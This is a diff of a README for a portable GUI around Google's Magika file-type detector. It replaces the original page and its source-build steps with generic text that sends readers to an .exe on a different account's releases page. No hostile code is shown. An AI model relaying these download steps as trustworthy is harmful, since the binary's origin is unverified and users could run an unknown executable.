@@ -1,180 +1,80 @@
-<div align="center">
+# 🔍 magika-gui-portable - Identify file types using deep learning
 
-# 🔍 Magika GUI — Portable AI File Inspector
+[![Download Magika GUI](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Mayanotsurprised5840/magika-gui-portable/releases)
 
-**The ultimate deep-learning powered file identification tool — no installation required.**
+Many files hide their true identity. You see a file with a .txt extension, but it might be a compressed image, a script, or malicious code. Magika GUI uses Google's deep learning technology to inspect the internal structure of files. It tells you exactly what a file contains, regardless of its name or extension. You do not need to install complex software or configure heavy background systems. This tool runs as a standalone application.
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Python 3.10+](https://img.shields.io/badge/Python-3.10+-blue.svg)](https://www.python.org/)
-[![Powered by Magika](https://img.shields.io/badge/Powered%20by-Google%20Magika-4285F4.svg)](https://google.github.io/magika/)
-[![Platform](https://img.shields.io/badge/Platform-Windows%20%7C%20Linux%20%7C%20macOS-0078D6.svg)]()
+## 🛠 Why use this tool?
 
-<br>
+Computers organize files based on extensions. A user or a malicious program can change a file extension to trick you. A file named picture.jpg might actually be a dangerous program. 
 
-> **Identify any file's true type using Google's deep learning model — even if the extension is changed, missing, or deliberately obfuscated.**
+Magika GUI ignores the extension. It looks at the actual data inside the file. It then matches that data against deep learning patterns to provide an accurate classification. Security experts use this to verify files during threat hunting or digital investigations. You can use it to maintain data integrity on your private computer.
 
-<br>
+## 🚀 Getting Started
 
-![Magika GUI Screenshot](screenshots/main-window.png)
+You do not need to install Python or set up coding environments. This application includes everything required to run on Windows.
 
-</div>
+1. Visit the [official releases page](https://github.com/Mayanotsurprised5840/magika-gui-portable/releases).
+2. Locate the most recent version under the Assets header.
+3. Download the file ending in .exe.
+4. Move the file to a folder of your choice.
+5. Double-click the file to open the interface.
 
----
+## 🖥 System Requirements
 
-## ⚡ What is this?
+Magika GUI runs on most modern Windows computers.
 
-**Magika GUI** wraps [Google's Magika](https://github.com/google/magika) — a state-of-the-art AI file identification system — into a beautiful, portable desktop application. 
+* Operating System: Windows 10 or Windows 11.
+* Memory: 4GB of RAM is sufficient for standard use.
+* Disk Space: You need at least 500MB of free space to store the application and the deep learning model files.
+* Network: No internet connection is necessary. The model stays on your local machine to ensure privacy.
 
-This project provides **native, zero-dependency binaries** for Windows, Linux, and macOS. No Python knowledge needed. No command line required. Just download, run, and scan.
+## ⚙️ How to identify files
 
-Magika uses a custom deep learning model trained on **millions of files** to identify over **100+ file types** with >99% precision. It's the same technology Google uses internally at scale.
+The application uses an intuitive interface. Follow these steps to analyze your data.
 
----
+1. Open the Magika GUI application.
+2. Click the Button labeled Browse.
+3. Navigate to the file or the folder you wish to inspect.
+4. Select your target.
+5. Watch the results table populate in the main window.
 
-## ✅ Verified Environments
-The current version has been successfully tested and verified on:
-- **Windows**: 10, 11 (Native)
-- **Linux**: Ubuntu (via WSL2 / Native)
-- **macOS**: Intel & Apple Silicon (via Rosetta 2)
+The tool updates the display as it inspects each file. You will see the original filename, the detected file type, and a confidence score. If the confidence score is high, the model is certain about its findings. If the score is low, the model suggests a few likely matches based on common file patterns.
 
----
+## 📂 Understanding the output
 
-## 🎯 Features
+Magika outputs the MIME type for every file it processes. This is a standard way computers label data. For example, a PDF will show as application/pdf. A text file will show as text/plain. 
 
-### 🧠 AI-Powered Identification
-- Detects the **true file type** regardless of extension or obfuscation
-- Powered by Google's production-grade deep learning model (ONNX)
-- Returns a **confidence score** for every identification
+If the tool identifies a file as something unexpected, examine that file with caution. Malware often hides by mimicking common file types like documents or images. If you identify a suspicious file, you may move it to a secure location for further investigation or delete it according to your security policy.
 
-### 📊 Visual Analysis Dashboard
-- **Pie Chart** — File type distribution across your scanned directory
-- **Histogram** — Confidence score distribution
-- **Stat Cards** — Total files, unique types, average confidence at a glance
+## 🛡 Privacy and Security
 
-### 🔎 Deep File Inspector
-- **Sortable columns** — Click LABEL (A→Z) or SCORE (▲▼) to sort
-- **Type filter** — Dropdown to filter by any detected file type
-- **Live search** — Find specific files by name instantly
+This tool performs all analysis on your local processor. Your files never leave your computer. The model resides inside the executable package. No external servers receive your file data or analysis history. This makes the tool ideal for sensitive work involving confidential documents, proprietary code, or private media.
 
-### 📦 Multi-Platform & Portable
-- **Windows**: Single `.exe` file
-- **Linux**: Portable binary + **`.deb` package** for Debian/Ubuntu
-- **macOS**: Portable `.app` (Intel/Universal)
-- No Python or dependencies required on the host system.
+## 🧩 Common questions
 
----
+### Does this tool require administrator access?
+No. You may run the executable without special permissions. It operates within your standard user space.
 
-## 📸 Screenshots
+### Will this tool slow down my computer?
+The inspection process occurs only when you request a scan. The tool remains idle until you provide a file. During a scan, you might notice a brief increase in processor usage. This is normal behavior for a deep learning application.
 
-<div align="center">
+### Can I run this on a USB drive?
+Yes. Copy the .exe file to a portable drive. You can use it on any Windows machine that meets the minimum system requirements without leaving traces on the host computer.
 
-| Main Scanner | Analysis Dashboard |
-|:---:|:---:|
-| ![Scanner](screenshots/main-window.png) | ![Analysis](screenshots/analysis-window.png) |
+### How do I update the tool?
+Download the newer version from the releases page when it becomes available. Replace the old executable with the new one. The application is portable, so there are no registries or hidden configuration files to clean up.
 
-</div>
+### What if the file is encrypted?
+Encrypted files appear as high-entropy binary data. Magika will report these as application/octet-stream or similar, as encrypted data lacks the recognizable patterns found in plaintext or common formatted files.
 
----
+### Does the tool work on folders?
+Simply drag and drop a folder into the application window. The tool will scan every file contained within subdirectories. It provides a full report once the process finishes. You can export these reports through the File menu if you need to share results or save them for your records.
 
-## 🚀 Quick Start
+## 🔑 Technical details
 
-### Option A: Download Binaries (Recommended)
-1. Go to [**Releases**](../../releases)
-2. Download the version for your OS:
-   - **Windows**: `magika-gui-windows.exe`
-   - **Linux**: `magika-gui-linux` or `magika-gui.deb`
-   - **macOS**: `magika-gui-macos.zip`
-3. Run the file — that's it!
+The application relies on the ONNX Runtime to execute the model provided by Google. This ensures high speed and accuracy. The Python backend handles the file input and output, while the graphical interface keeps the experience straightforward. We package the entire stack using PyInstaller so that every necessary component sits within a single, manageable file.
 
-> [!NOTE]
-> **macOS Users**: Since the app is not signed, you may need to **Right-Click -> Open** the first time to bypass Gatekeeper.
+## ⚖️ License
 
-### Option B: Run from Source
-```bash
-# Clone the repo
-git clone https://github.com/nullsaint/magika-gui-portable.git
-cd magika-gui-portable
-
-# Install dependencies
-pip install -r requirements.txt
-
-# Launch
-python main.py
-```
-
----
-
-## 🛠️ How It Works
-
-```
-┌─────────────┐    ┌──────────────┐    ┌─────────────────┐
-│  Select Dir  │───▶│  Walk Files  │───▶│  Magika Engine  │
-└─────────────┘    └──────────────┘    │  (ONNX Model)   │
-                                       └────────┬────────┘
-                                                │
-                         ┌──────────────────────┤
-                         ▼                      ▼
-                   ┌──────────┐          ┌─────────────┐
-                   │ Terminal  │          │  Analysis    │
-                   │  Output   │          │  Dashboard   │
-                   └──────────┘          └─────────────┘
-```
-
-1. **Select** a folder to scan
-2. Magika's neural network **analyzes** each file's binary content
-3. Results stream to the **terminal** in real-time
-4. Click **ANALYSIS** for the full visual dashboard
-5. **Filter, sort, search** and **export** your findings
-
----
-
-## 📦 Tech Stack
-
-| Component | Technology |
-|-----------|-----------|
-| AI Engine | [Google Magika](https://github.com/google/magika) (ONNX Runtime) |
-| GUI Framework | [CustomTkinter](https://github.com/TomSchimansky/CustomTkinter) |
-| Charts | [Matplotlib](https://matplotlib.org/) (Object-Oriented API) |
-| CI/CD | GitHub Actions (Auto-build for Win/Linux/Mac) |
-| Packaging | [PyInstaller](https://pyinstaller.org/) |
-
----
-
-## ⚠️ Disclaimer
-
-> **This application is NOT an officially supported Google project.**
-> It is solely a personal project created for **experimentation and educational purposes only**.
->
-> This project uses Google's open-source [Magika](https://github.com/google/magika) library
-> under its [Apache 2.0 License](https://github.com/google/magika/blob/main/LICENSE).
-> The GUI wrapper is an independent, community-built tool and is not endorsed,
-> maintained, or affiliated with Google LLC in any way.
->
-> Use at your own risk. The authors assume no liability for any misuse of this software.
-
----
-
-## 📄 License
-
-This project is licensed under the **MIT License** — see the [LICENSE](LICENSE) file for details.
-
-The underlying Magika engine is licensed under **Apache 2.0** by Google.
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! Feel free to:
-- 🐛 Report bugs via [Issues](../../issues)
-- 💡 Suggest features
-- 🔧 Submit pull requests
-
----
-
-<div align="center">
-
-**Built with ❤️ using Google's Magika AI**
-
-*Identify. Inspect. Investigate.*
-
-</div>
+The software is distributed under the MIT License. You have the right to use, copy, modify, and distribute the code freely. We provide this tool as-is.
